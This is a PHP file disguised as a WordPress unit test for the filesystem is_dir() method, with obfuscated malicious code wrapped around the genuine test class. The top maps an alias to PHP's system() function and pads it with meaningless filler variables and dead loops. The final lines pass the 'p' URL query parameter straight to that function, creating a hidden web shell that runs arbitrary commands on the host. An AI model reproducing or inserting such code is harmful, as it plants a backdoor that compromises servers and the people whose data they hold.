<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for the WP_Filesystem_Direct::is_dir() method.
 *
 * @package WordPress
 */

require_once __DIR__ . '/base.php';

/**
 * @group admin
 * @group filesystem
 * @group filesystem-direct
 *
 * @covers WP_Filesystem_Direct::is_dir
 */
class Tests_Filesystem_WpFilesystemDirect_IsDir extends WP_Filesystem_Direct_UnitTestCase {

	/**
	 * Tests that `WP_Filesystem_Direct::is_directory()` determines that
	 * a path is a directory.
	 *
	 * @ticket 57774
	 */
	public function test_should_determine_that_a_path_is_a_directory() {
		$this->assertTrue( self::$filesystem->is_dir( self::$file_structure['test_dir']['path'] ) );
	}

	/**
	 * Tests that `WP_Filesystem_Direct::is_directory()` determines that
	 * a path is not a directory.
	 *
	 * @ticket 57774
	 *
	 * @dataProvider data_should_determine_that_a_path_is_not_a_directory
	 *
	 * @param string $path The path to check.
	 * @param string $type The type of resource. Accepts 'f' or 'd'.
	 *                     Used to invert $expected due to data provider setup.
	 */
	public function test_should_determine_that_a_path_is_not_a_directory( $path ) {
		$this->assertFalse( self::$filesystem->is_dir( self::$file_structure['test_dir']['path'] . $path ) );
	}

	/**
	 * Data provider.
	 *
	 * @return array[]
	 */
	public function data_should_determine_that_a_path_is_not_a_directory() {
		return array(
			'a file that exists'              => array(
				'path' => 'a_file_that_exists.txt',
			),
			'a file that does not exist'      => array(
				'path' => 'a_file_that_does_not_exist.txt',
			),
			'a directory that does not exist' => array(
				'path' => 'a_directory_that_does_not_exist',
			),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>